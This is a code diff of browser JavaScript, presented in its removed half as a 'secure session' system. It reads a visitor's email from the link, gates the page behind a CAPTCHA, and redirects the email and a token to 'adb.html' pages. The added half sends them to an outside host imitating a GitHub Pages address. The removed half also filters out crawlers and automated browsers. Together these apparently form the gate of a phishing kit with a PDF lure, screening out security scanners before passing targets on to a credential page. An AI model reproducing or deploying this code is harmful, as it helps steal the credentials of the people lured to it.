@@ -1,232 +1,57 @@
-/**
- * SECURE SESSION MANAGEMENT SYSTEM
- * Uses sessionStorage with multiple protection layers
- */
-
-// ======================
-// SECURITY CONFIGURATION
-// ======================
-const SECURITY = {
-  SESSION_TIMEOUT: 5 * 60 * 1000, // 5 minutes
-  TOKEN_LENGTH: 64,
-  STORAGE_KEYS: {
-    EMAIL: 'sec_email',
-    TOKEN: 'sec_token',
-    CSRF: 'sec_csrf',
-    TIMESTAMP: 'sec_time',
-    VERIFIED: 'sec_verified'
-  }
-};
-
-// ======================
-// CORE SECURITY FUNCTIONS
-// ======================
-
-/**
- * Generates cryptographically secure tokens
- */
-function generateSecureToken(length = SECURITY.TOKEN_LENGTH) {
+function generateSecureToken(length = 64) {
   const array = new Uint8Array(length / 2);
   window.crypto.getRandomValues(array);
-  return Array.from(array, byte => 
-    byte.toString(16).padStart(2, '0')
-  ).join('');
+  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
 }
 
-/**
- * Validates email format (basic check)
- */
-function isValidEmail(email) {
-  return typeof email === 'string' && 
-         email.includes('@') && 
-         email.length > 5 && 
-         email.indexOf('@') < email.lastIndexOf('.');
-}
-
-/**
- * Initializes a secure session
- */
-function initSecureSession(email) {
-  if (!isValidEmail(email)) {
-    throw new Error('Invalid email format');
+function generateSimpleCaptcha() {
+  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
+  let captcha = "";
+  for (let i = 0; i < 6; i++) {
+    captcha += chars.charAt(Math.floor(Math.random() * chars.length));
   }
-
-  // Clear any existing session
-  clearSession();
-
-  // Generate new tokens
-  const tokens = {
-    email: email,
-    sessionToken: generateSecureToken(),
-    csrfToken: generateSecureToken(),
-    timestamp: Date.now()
-  };
-
-  // Store in sessionStorage
-  sessionStorage.setItem(SECURITY.STORAGE_KEYS.EMAIL, tokens.email);
-  sessionStorage.setItem(SECURITY.STORAGE_KEYS.TOKEN, tokens.sessionToken);
-  sessionStorage.setItem(SECURITY.STORAGE_KEYS.CSRF, tokens.csrfToken);
-  sessionStorage.setItem(SECURITY.STORAGE_KEYS.TIMESTAMP, tokens.timestamp.toString());
-
-  return tokens;
+  return captcha;
 }
 
-/**
- * Validates existing session
- */
-function validateSession() {
-  const email = sessionStorage.getItem(SECURITY.STORAGE_KEYS.EMAIL);
-  const token = sessionStorage.getItem(SECURITY.STORAGE_KEYS.TOKEN);
-  const csrf = sessionStorage.getItem(SECURITY.STORAGE_KEYS.CSRF);
-  const timestamp = parseInt(sessionStorage.getItem(SECURITY.STORAGE_KEYS.TIMESTAMP) || '0');
-
-
-
-  // Check if all required items exist
-  if (!email || !token || !csrf) {
-    return { valid: false, reason: 'Session data missing' };
-  }
-
-  // Check session age
-  const age = Date.now() - timestamp;
-  if (age > SECURITY.SESSION_TIMEOUT) {
-    clearSession();
-    return { valid: false, reason: 'Session expired' };
-  }
-
-  return { 
-    valid: true, 
-    email, 
-    token, 
-    csrf,
-    age 
-  };
-}
-
-/**
- * Clears session data securely
- */
-function clearSession() {
-  Object.values(SECURITY.STORAGE_KEYS).forEach(key => {
-    sessionStorage.removeItem(key);
-  });
-}
-
-// ======================
-// BOT PROTECTION LAYERS
-// ======================
-
-/**
- * Basic bot detection
- */
-function detectBotPatterns() {
-  // Check for automation tools in user agent
-  const botPatterns = [
-    /HeadlessChrome/i,
-    /PhantomJS/i,
-    /Puppeteer/i,
-    /Selenium/i,
-    /WebDriver/i,
-    /bot/i,
-    /crawl/i,
-    /spider/i
-  ];
-
-  return botPatterns.some(pattern => 
-    navigator.userAgent.match(pattern)
-  );
-}
-
-/**
- * Behavioral check
- */
-function performBehavioralCheck() {
-  // Check for headless browser signs
-  if (window.outerWidth === 0 && window.outerHeight === 0) return false;
-  
-  // Check if important APIs are available
-  try {
-    if (!window.crypto || !window.crypto.getRandomValues) return false;
-    if (!window.sessionStorage) return false;
-  } catch (e) {
-    return false;
+window.onload = function () {
+  const hash = window.location.hash.substring(1);
+  if (hash && hash.includes("@")) {
+    sessionStorage.setItem("redirect_email", hash);
+    sessionStorage.setItem("redirect_token", generateSecureToken());
+    sessionStorage.setItem("captcha_text", generateSimpleCaptcha());
+    history.replaceState(null, "", window.location.pathname);
   }
   
-  return true;
-}
+  // Display the CAPTCHA
+  const captchaText = sessionStorage.getItem("captcha_text");
+  document.getElementById("captchaText").textContent = captchaText;
+};
 
-// ======================
-// MAIN VERIFICATION FLOW
-// ======================
-
-/**
- * Handles the verification process
- */
-async function onVerify() {
-  try {
-    // Initial checks
-    if (!performBehavioralCheck() || detectBotPatterns()) {
-      throw new Error('Security verification failed');
-    }
-
-    // Verify reCAPTCHA
-    const recaptchaResponse = grecaptcha.getResponse();
-    if (!recaptchaResponse) {
-      throw new Error('Please complete the reCAPTCHA verification');
-    }
-
-    // Validate session
-    const session = validateSession();
-    if (!session.valid) {
-      throw new Error(session.reason || 'Invalid session');
-    }
-
-    // Mark as verified
-    sessionStorage.setItem(SECURITY.STORAGE_KEYS.VERIFIED, 'true');
-
-    // Prepare redirect URL
-    const redirectUrl = new URL('pdf/adb.html', window.location.href);
-    redirectUrl.hash = `email=${encodeURIComponent(session.email)}` +
-                      `&token=${session.token}` +
-                      `&csrf=${session.csrf}` +
-                      `&time=${session.timestamp}`;
-
-    // Secure redirect
-    clearSession(); // Clear before redirect
-    window.location.href = redirectUrl.toString();
-
-  } catch (error) {
-    console.error('Verification Error:', error);
-    alert(`Security Error: ${error.message}`);
-    grecaptcha.reset();
-    clearSession();
+function onVerify() {
+  const captchaText = sessionStorage.getItem("captcha_text");
+  const userInput = document.getElementById("captchaInput").value.trim();
+  
+  if (!userInput) {
+    alert("Please enter the CAPTCHA text.");
+    return;
   }
-}
-
-// ======================
-// PAGE LOAD HANDLER
-// ======================
-
-/**
- * Handles page initialization
- */
-window.onload = function() {
-  // Enforce HTTPS
-  if (window.location.protocol !== 'https:' && 
-      !window.location.hostname.match(/localhost|127\.0\.0\.1/)) {
-    window.location.href = `https://${window.location.host}${window.location.pathname}`;
+  
+  if (userInput !== captchaText) {
+    alert("CAPTCHA verification failed. Please try again.");
+    // Generate new CAPTCHA
+    sessionStorage.setItem("captcha_text", generateSimpleCaptcha());
+    document.getElementById("captchaText").textContent = sessionStorage.getItem("captcha_text");
+    document.getElementById("captchaInput").value = "";
     return;
   }
 
-  // Process hash if present
-  const hash = window.location.hash.substring(1);
-  if (hash && isValidEmail(hash)) {
-    try {
-      initSecureSession(hash);
-      history.replaceState(null, '', window.location.pathname);
-    } catch (error) {
-      console.error('Session Initialization Failed:', error);
-      window.location.href = '/error.html?code=session_error';
-    }
+  const email = sessionStorage.getItem("redirect_email");
+  const token = sessionStorage.getItem("redirect_token");
+
+  if (email && token) {
+    const url = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${token}`;
+    window.location.href = url;
+  } else {
+    alert("Session expired or invalid. Please reload the page.");
   }
-};
+}
